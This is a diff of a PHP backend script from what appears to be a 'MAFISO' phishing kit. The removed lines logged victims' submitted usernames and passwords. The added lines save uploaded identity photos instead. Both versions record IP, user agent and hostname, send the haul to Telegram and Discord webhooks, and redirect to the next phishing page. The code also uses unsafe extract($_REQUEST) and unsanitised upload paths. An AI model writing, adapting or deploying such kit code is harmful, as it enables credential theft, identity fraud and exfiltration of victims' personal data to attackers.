@@ -1,10 +1,8 @@
 <?php
-if (isset($_POST["user"]) && isset($_POST["pass"]) )
-{
 session_start();
+if(isset($_POST['img_submit'])){
+	// code...
 
-$user = $_POST["user"];
-$pass = $_post["pass"];
 $ip   = $_SERVER['REMOTE_ADDR'];
 $UA   = $_SERVER['HTTP_USER_AGENT'];
 $host = $_SERVER['REMOTE_HOST'];
@@ -17,38 +15,39 @@ $webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
 extract($_REQUEST);
 
 
-$file=fopen("../results/logs.txt","a");
+	
+	$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 
+	$img_name=$_FILES['file']['name'];
+	$tmp_img_name=$_FILES['file']['tmp_name'];
+	$dir='../results/uploads/';
+	$dir1= "/" .$dir. "" .$img_name. "" ;
+	$dir1= trim(str_replace('../','',$dir1));
+	$actual_link = trim(str_replace('/process/config5.php','',$actual_link));
+	move_uploaded_file($tmp_img_name,$dir.$img_name);
+	
 
-# Format for log.txt file
-// Here variable $a is just an example (replace with your own variables)
-
-fwrite($file," << N E W  M A F I S O  L O G I N >>\r\n");
-fwrite($file, "Username: ". $user ."\r\n");
-fwrite($file, "Password: ". $pass ."\r\n");
-fwrite($file," <<   S E S S I O N    I N F O    >>\r\n");
+$file=fopen("../results/pic1.txt","a");
+fwrite($file," << N E W        M A F I S O     I D    >>\r\n");
+fwrite($file," pic1 dir : ".$actual_link."".$dir1."\r\n");
+fwrite($file," <<       S E S S I O N    I N F O      >>\r\n");
 fwrite($file, "User Agent: ". $UA ."\r\n");
 fwrite($file, "IP: ". $ip ."\r\n");
 fwrite($file, "HOSTNAME : ". $host ."\r\n");
-fwrite($file,"<<    E N D   O F   L O G I N     >>\r\n");
+fwrite($file,"<<      E N D      O F       I D        >>\r\n");
 fclose($file);
-
-
-# Store Post values in variables
-// Here variable $a is just an example (replace with your own variables)
-$_SESSION['check1'] = "true";
+$_SESSION['check6'] = "true";
 
 
 # Format for Telegram & Discord
 // Here variable $a is just an example (replace with your own variables)
-$data = " << N E W  M A F I S O  L O G I N >>\r\n";
-$data.= " > Username: $user\r\n";
-$data.= " > Password: $pass\r\n";
-$data.= " <<   S E S S I O N    I N F O    >>\r\n";
+$data = " << N E W        M A F I S O     I D    >>\r\n";
+$data.= " > pic1 : $actual_link$dir1 \r\n";
+$data.= " <<       S E S S I O N    I N F O      >>\r\n";
 $data.= " > User Agent: $UA \r\n";
 $data.= " >IP : $ip \r\n";
 $data.= " >HOSTNAME : $host \r\n";
-$data.= "<<    E N D   O F   L O G I N     >>\r\n";
+$data.= "<<      E N D      O F       I D        >>\r\n";
 
 
 
@@ -79,10 +78,20 @@ if ($discord == "on"){
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     $response = curl_exec($ch);
 }
-
-header("location: ../accounts.php");
+header("Location: ../pic2.php");
+exit();
 }
+
+
+
 else
 {
     exit(header("HTTP/1.0 404 Not Found"));
 }
+
+
+
+
+
+
+?>
